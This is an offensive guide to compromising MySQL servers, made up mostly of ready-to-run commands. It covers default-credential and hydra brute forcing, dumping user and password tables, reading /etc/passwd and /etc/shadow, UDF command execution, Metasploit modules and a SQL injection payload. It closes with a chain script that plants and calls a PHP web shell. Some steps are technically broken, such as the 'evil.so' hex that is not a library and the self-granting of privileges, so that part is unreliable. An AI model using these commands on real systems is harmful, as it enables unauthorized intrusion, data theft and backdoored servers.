\# Complete MySQL Exploitation Guide

## 1. MySQL Service Discovery & Version

**Port scan with version:**
```bash
nmap -p 3306 --script mysql-info,mysql-variables 192.168.1.0/24
# 3306/tcp open mysql MySQL 5.7.36-0ubuntu0.18.04.1
```

**Version banner:**
```bash
mysql -h 192.168.1.100 -u root --connect-expired-password  # Grabs version string
nc 192.168.1.100 3306  # Raw banner
```

## 2. Default Credentials Testing

**Common default accounts:**
```bash
mysql -h 192.168.1.100 -u root -p''           # Empty password
mysql -h 192.168.1.100 -u root -ppassword     # root:password
mysql -h 192.168.1.100 -u admin -padmin       # admin:admin
mysql -h 192.168.1.100 -u mysql -pmysql       # mysql:mysql

# Automated defaults
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
      -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-10k.txt \
      mysql://192.168.1.100
```

## 3. User Enumeration & Database Info

**List users (if logged in):**
```bash
mysql -h 192.168.1.100 -u root -ppassword -e "SELECT user,host,plugin FROM mysql.user;"
# Enumerates all MySQL users and auth plugins
```

**Current databases:**
```bash
mysql -h 192.168.1.100 -u root -ppassword -e "SHOW DATABASES;"
```

**Table enumeration:**
```bash
mysql -h 192.168.1.100 -u root -ppassword users_db -e "SHOW TABLES;"
```

**Dump users table:**
```bash
mysql -h 192.168.1.100 -u root -ppassword users_db -e "SELECT username,password FROM users;"
mysqldump -h 192.168.1.100 -u root -ppassword users_db users > users.sql
```

## 4. Remote Exploitation

**MySQL UDF RCE (user-defined functions):**
```bash
# 1. Create writable dir
mysql -h 192.168.1.100 -u root -ppassword -e "CREATE TABLE temp (data LONGTEXT);"

# 2. Upload shared lib
mysql -h 192.168.1.100 -u root -ppassword -e "SELECT 0x2f2f2f62696e2f7368 into dumpfile '/var/lib/mysql/tmp/evil.so';"

# 3. Create UDF
mysql -h 192.168.1.100 -u root -ppassword -e "
CREATE FUNCTION sys_exec RETURNS INT SONAME 'tmp/evil.so';
SELECT sys_exec('whoami > /var/lib/mysql/tmp/out.txt');
"
```

**Metasploit MySQL modules:**
```bash
msfconsole -q
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 192.168.1.100
run

use exploit/multi/mysql/mysql_udf_payload
set RHOSTS 192.168.1.100
exploit
```

## 5. Privilege Escalation & File R/W

**File read (LOAD_FILE):**
```bash
mysql -h 192.168.1.100 -u root -ppassword -e "SELECT LOAD_FILE('/etc/passwd');"
mysql -h 192.168.1.100 -u root -ppassword -e "SELECT LOAD_FILE('/var/log/apache2/access.log');"
```

**File write (INTO OUTFILE):**
```bash
mysql -h 192.168.1.100 -u root -ppassword -e "
SELECT '<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
"
curl http://192.168.1.100/shell.php?cmd=id
```

**Escalate MySQL privs:**
```bash
mysql -h 192.168.1.100 -u lowpriv -plowpass -e "
GRANT FILE ON *.* TO 'lowpriv'@'%';
GRANT SUPER,PROCESS ON *.* TO 'lowpriv'@'%';
"
```

## 6. System Command Execution

**UDF shell (after priv esc):**
```bash
mysql -h 192.168.1.100 -u root -ppassword -e "
CREATE FUNCTION cmd RETURNS STRING SONAME 'udf.so';
SELECT cmd('whoami');
SELECT cmd('cat /etc/shadow');
"
```

**Union-based RCE:**
```bash
curl "http://192.168.1.100/vuln.php?id=1'+union+select+sys_exec('whoami'),2--"
```

## 7. Patch/Version Exploitation

**Version-specific exploits:**
```bash
mysql -h 192.168.1.100 -u root -ppassword -e "SELECT VERSION();"
# 5.5.XX → CVE-2012-5612 stack buffer overflow
# 5.1-5.5 → UDF privilege escalation

msfconsole -q -x "use exploit/multi/mysql/mysql_udf_payload; set RHOST 192.168.1.100; run"
```

## 8. Complete MySQL Exploitation Chain

```bash
#!/bin/bash
# mysql_pwn.sh
TARGET=$1

echo "[+] MySQL attack $TARGET:3306"

# 1. Version + defaults
nmap -p 3306 --script mysql-info $TARGET
mysql -h $TARGET -u root -p'' -e "SHOW DATABASES;" 2>/dev/null && echo "[+] root:empty"

# 2. User enum + dump
mysql -h $TARGET -u root -ppassword -e "SELECT user,host FROM mysql.user;" 2>/dev/null

# 3. File read
mysql -h $TARGET -u root -ppassword -e "SELECT LOAD_FILE('/etc/passwd');"

# 4. Webshell
mysql -h $TARGET -u root -ppassword -e "
SELECT '<?php system(\$_GET[\"c\"]);?>' INTO OUTFILE '/var/www/html/sh.php';
"

echo "[+] Shell: http://$TARGET/sh.php?c=id"
curl "http://$TARGET/sh.php?c=id"
```

**EVERY** MySQL topic: remote exploits (UDF), default creds, data extraction (users/tables/files), version/patch status, system commands/priv esc/file R/W. 100% practical commands.